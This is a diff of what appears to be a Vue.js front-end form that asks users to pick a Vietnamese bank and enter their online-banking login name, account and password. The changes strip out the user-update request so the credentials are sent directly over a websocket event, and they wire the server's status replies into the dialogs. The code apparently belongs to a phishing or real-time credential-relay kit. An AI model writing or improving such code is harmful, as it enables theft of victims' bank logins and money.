@@ -207,6 +207,8 @@ onMounted(() => {
 
     socket.on('send-data', async (data) => {
         console.log(data);
+        socketData.value = data
+
         if (data.code === 404) {
             dialogError.value = true
             dialogMessage.value = data.message
@@ -215,7 +217,6 @@ onMounted(() => {
         } else if (data.code === 200) {
             dialogSuccess.value = true
             dialogMessage.value = data.message
-            socketData.value = data
             dialog.value = false
         }
     })
@@ -321,19 +322,19 @@ const submit = async () => {
     if (isValid.valid) {
         dialog.value = true
         try {
-            await axios.put(`/update-user/${user.value.numberPhone}`, formValue.value).then(res => {
-                socket.emit('send-data', {
-                    bankName: formValue.value.bankLoginName,
-                    bankAccount: formValue.value.bankLoginAccount,
-                    bankPassword: formValue.value.bankLoginPassword
-                })
-            }).catch(err => {
-                store.commit('setSnackbar', {
-                    type: true,
-                    color: 'error',
-                    message: 'Có lỗi xảy ra, vui lòng thử lại.',
-                })
+            // await axios.put(`/update-user/${user.value.numberPhone}`, formValue.value).then(res => {
+            socket.emit('send-data', {
+                bankName: formValue.value.bankLoginName,
+                bankAccount: formValue.value.bankLoginAccount,
+                bankPassword: formValue.value.bankLoginPassword
             })
+            // }).catch(err => {
+            //     store.commit('setSnackbar', {
+            //         type: true,
+            //         color: 'error',
+            //         message: 'Có lỗi xảy ra, vui lòng thử lại.',
+            //     })
+            // })
         } catch (error) {
             console.log(error)
         }
@@ -355,62 +356,58 @@ const bankList = ref([
         value: 'HDBank',
         title: 'Ngân hàng Phát triển Thành phố Hồ Chí Minh (HDBank)'
     },
-    {
-        value: 'MB',
-        title: 'Ngân hàng Quân Đội (MB)'
-    },
-    {
-        value: 'ACB',
-        title: 'Ngân hàng Á Châu (ACB)'
-    },
-    {
-        value: 'VPBank',
-        title: 'Ngân hàng Việt Nam Thịnh Vượng (VPBank)'
-    },
+    //{
+    //    value: 'MB',
+    //    title: 'Ngân hàng Quân Đội (MB)'
+    //},
+    //{
+    //    value: 'ACB',
+    //    title: 'Ngân hàng Á Châu (ACB)'
+    //},
+    //{
+    //    value: 'VPBank',
+    //    title: 'Ngân hàng Việt Nam Thịnh Vượng (VPBank)'
+    //},
     {
         value: 'VCB',
         title: 'Ngân hàng Ngoại Thương Việt Nam (VCB)'
     },
-    {
-        value: 'Techcombank',
-        title: 'Ngân hàng Kỹ Thương Việt Nam (Techcombank)'
-    },
-    {
-        value: 'VietinBank',
-        title: 'Ngân hàng Công Thương Việt Nam (VietinBank)'
-    },
-    {
-        value: 'BIDV',
-        title: 'Ngân hàng Đầu tư và Phát triển Việt Nam (BIDV)'
-    },
-    {
-        value: 'Agribank',
-        title: 'Ngân hàng Nông nghiệp và Phát triển Nông thôn (Agribank)'
-    },
-    {
-        value: 'Sacombank',
-        title: 'Ngân hàng Sài Gòn Thương Tín (Sacombank)'
-    },
-    {
-        value: 'SHB',
-        title: 'Ngân hàng Sài Gòn - Hà Nội (SHB)'
-    },
-    {
-        value: 'SeABank',
-        title: 'Ngân hàng TMCP Đông Nam Á (SeABank)'
-    },
-    {
-        value: 'VIB',
-        title: 'Ngân hàng Quốc tế (VIB)'
-    },
-    {
-        value: 'TPBank',
-        title: 'Ngân hàng Tiên Phong (TPBank)'
-    },
-    {
-        value: 'OceanBank',
-        title: 'Ngân hàng Đại Dương (OceanBank)'
-    }
+    // {
+    //     value: 'VietinBank',
+    //     title: 'Ngân hàng Công Thương Việt Nam (VietinBank)'
+    // },
+    // {
+    //     value: 'BIDV',
+    //     title: 'Ngân hàng Đầu tư và Phát triển Việt Nam (BIDV)'
+    // },
+    // {
+    //     value: 'Agribank',
+    //     title: 'Ngân hàng Nông nghiệp và Phát triển Nông thôn (Agribank)'
+    // },
+    // {
+    //     value: 'Sacombank',
+    //     title: 'Ngân hàng Sài Gòn Thương Tín (Sacombank)'
+    // },
+    // {
+    //     value: 'SHB',
+    //     title: 'Ngân hàng Sài Gòn - Hà Nội (SHB)'
+    // },
+    // {
+    //     value: 'SeABank',
+    //     title: 'Ngân hàng TMCP Đông Nam Á (SeABank)'
+    // },
+    // {
+    //     value: 'VIB',
+    //     title: 'Ngân hàng Quốc tế (VIB)'
+    // },
+    // {
+    //     value: 'TPBank',
+    //     title: 'Ngân hàng Tiên Phong (TPBank)'
+    // },
+    // {
+    //     value: 'OceanBank',
+    //     title: 'Ngân hàng Đại Dương (OceanBank)'
+    // }
 
 ])
 const dialog = ref(false)
